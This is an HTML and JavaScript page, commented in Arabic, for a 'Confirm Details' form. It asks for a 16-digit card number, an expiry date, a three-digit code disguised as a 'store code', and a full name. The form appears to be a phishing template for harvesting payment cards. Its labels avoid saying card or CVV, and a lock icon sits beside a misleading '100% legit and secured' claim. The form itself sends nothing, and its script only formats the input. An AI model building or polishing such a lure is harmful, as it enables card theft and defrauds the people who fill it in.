<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Confirm Details</title>

  <style>
    /* ====== RESET بسيط ====== */
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
      background-color: #f5f6f8;
      color: #222;
    }

    /* ====== تمركز البوكس في الصفحة ====== */
    .page-wrapper {
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 24px 12px;
    }

    /* ====== البوكس الخارجي الكبير ====== */
    .outer-card {
      background-color: #ffffff;
      border-radius: 20px;
      box-shadow: 0 10px 25px rgba(15, 23, 42, 0.08);
      padding: 22px 22px 26px;
      max-width: 420px;
      width: 100%;
      border: 1px solid #e5e7eb;
    }

    /* ====== سطر Available Methods + الصورة ====== */
    .methods-row {
      display: flex;
      align-items: center;
      gap: 8px;
      margin-bottom: 10px;
      white-space: nowrap;
      overflow: hidden;
    }

    .methods-label {
      font-size: 14px;
      font-weight: 500;
      color: #444;
    }

    .methods-img {
    width: 160px;    /* حجم مضبوط للموبايل */
    height: auto;    /* يخليه يحافظ على الشكل الصحيح */
    object-fit: contain;
    margin-left: 6px;
}
    /* ====== سطر القفل + النص ====== */
    .secure-row {
      display: flex;
      align-items: center;
      gap: 8px;
      margin-bottom: 18px;
      margin-top: 2px;
    }

    .secure-text {
      font-size: 14px;
      color: #374151;
    }

    /* ====== أيقونة القفل (نفس الروح اللي طلبتها) ====== */
    .lock-icon {
      width: 16px;
      height: 16px;
      border-radius: 6px;
      border: 2px solid #16a34a;
      position: relative;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .lock-icon::before {
      content: "";
      position: absolute;
      top: -6px;
      width: 10px;
      height: 9px;
      border-radius: 12px 12px 0 0;
      border: 2px solid #16a34a;
      border-bottom: none;
      background-color: #f5f6f8;
    }

    .lock-icon::after {
      content: "";
      width: 6px;
      height: 3px;
      border-radius: 0 0 10px 10px;
      border: 2px solid #16a34a;
      border-top: none;
      background-color: transparent;
      margin-top: 3px;
    }

    /* ====== البوكس الداخلي تبع الفورم ====== */
    .inner-card {
      background-color: #f9fafb;
      border-radius: 16px;
      border: 1px solid #e5e7eb;
      padding: 20px 18px 22px;
    }

    .title {
      text-align: center;
      font-size: 20px;
      font-weight: 600;
      margin-bottom: 18px;
      color: #111827;
    }

    .field-label {
      font-size: 14px;
      margin-bottom: 6px;
      color: #374151;
    }

    .field-row {
      display: flex;
      gap: 10px;
    }

    .field {
      margin-bottom: 14px;
      width: 100%;
    }

    input[type="text"] {
      width: 100%;
      padding: 10px 12px;
      border-radius: 8px;
      border: 1px solid #d1d5db;
      font-size: 14px;
      outline: none;
      transition: border-color 0.15s ease, box-shadow 0.15s ease;
      background-color: #ffffff;
    }

    input[type="text"]::placeholder {
      color: #9ca3af;
    }

    input[type="text"]:focus {
      border-color: #2563eb;
      box-shadow: 0 0 0 1px rgba(37, 99, 235, 0.2);
    }

    .hint {
      font-size: 11px;
      color: #9ca3af;
      margin-top: 2px;
    }

    .btn-submit {
      width: 100%;
      margin-top: 10px;
      padding: 11px 0;
      border-radius: 8px;
      border: none;
      background-color: #0070d2;
      color: #ffffff;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      transition: background-color 0.15s ease, transform 0.05s ease;
    }

    .btn-submit:active {
      transform: scale(0.99);
      background-color: #005bb0;
    }

    .btn-submit:hover {
      background-color: #005bb0;
    }

    @media (max-width: 480px) {
      .outer-card {
          max-width: 100%;
        padding: 18px 16px 22px;
      }

      .methods-row {
        flex-wrap: wrap;
      }

      .methods-img {
        height: 20px;
      }
    }
  </style>
</head>
<body>

  <div class="page-wrapper">
    <div class="outer-card">
      <!-- Available Methods + الصورة المشتركة -->
      <div class="methods-row">
        <span class="methods-label">Available Methods :</span>
        <img
          src="photo_2025-11-14_17-20-05.jpg"
          alt="Available payment methods"
          class="methods-img"
        />
      </div>

      <!-- القفل + النص -->
      <div class="secure-row">
        <div class="lock-icon"></div>
        <div class="secure-text">All usernames are 100% legit and secured</div>
      </div>

      <!-- البوكس الداخلي للفورم -->
      <div class="inner-card">
        <div class="title">Confirm Details</div>

        <form action="#" method="post">
          <!-- Number -->
          <div class="field">
            <div class="field-label">Number</div>
            <input
              type="text"
              id="cardNumber"
              placeholder="XXXX XXXX XXXX XXXX"
              inputmode="numeric"
              autocomplete="off"
              maxlength="19"
            />
          </div>

          <!-- Date + كود متجرنا -->
          <div class="field-row">
            <div class="field">
              <div class="field-label">Date</div>
              <input
                type="text"
                id="expiry"
                placeholder="MM/YY"
                inputmode="numeric"
                autocomplete="off"
                maxlength="5"
              />
            </div>

            <div class="field">
              <div class="field-label">كود متجرنا</div>
              <input
                type="text"
                id="storeCode"
                placeholder="000"
                inputmode="numeric"
                autocomplete="off"
                maxlength="3"
              />
            </div>
          </div>

          <!-- Name -->
          <div class="field">
            <div class="field-label">Name</div>
            <input
              type="text"
              id="fullName"
              placeholder=""
              autocomplete="off"
            />
            <div class="hint">* Full Name</div>
          </div>

          <button type="submit" class="btn-submit">Confirm</button>
        </form>
      </div>
    </div>
  </div>

  <!-- تنسيقات الإدخال (بدون أي Alerts أو إرسال بيانات) -->
  <script>
    // تنسيق رقم البطاقة: فقط أرقام، 16 رقم، مسافة كل 4
    const cardInput = document.getElementById("cardNumber");
    cardInput.addEventListener("input", function () {
      let value = this.value.replace(/\D/g, "");
      value = value.slice(0, 16);
      const parts = [];
      for (let i = 0; i < value.length; i += 4) {
        parts.push(value.slice(i, i + 4));
      }
      this.value = parts.join(" ");
    });

    // تنسيق تاريخ الانتهاء MM/YY
    const expiryInput = document.getElementById("expiry");
    expiryInput.addEventListener("input", function () {
      let val = this.value.replace(/\D/g, "");
      if (val.length > 4) val = val.slice(0, 4);
      if (val.length >= 3) {
        this.value = val.slice(0, 2) + "/" + val.slice(2);
      } else if (val.length >= 1) {
        this.value = val;
      } else {
        this.value = "";
      }
    });

    // كود المتجر: 3 أرقام فقط
    const storeCodeInput = document.getElementById("storeCode");
    storeCodeInput.addEventListener("input", function () {
      let val = this.value.replace(/\D/g, "");
      this.value = val.slice(0, 3);
    });
  </script>
</body>
</html>
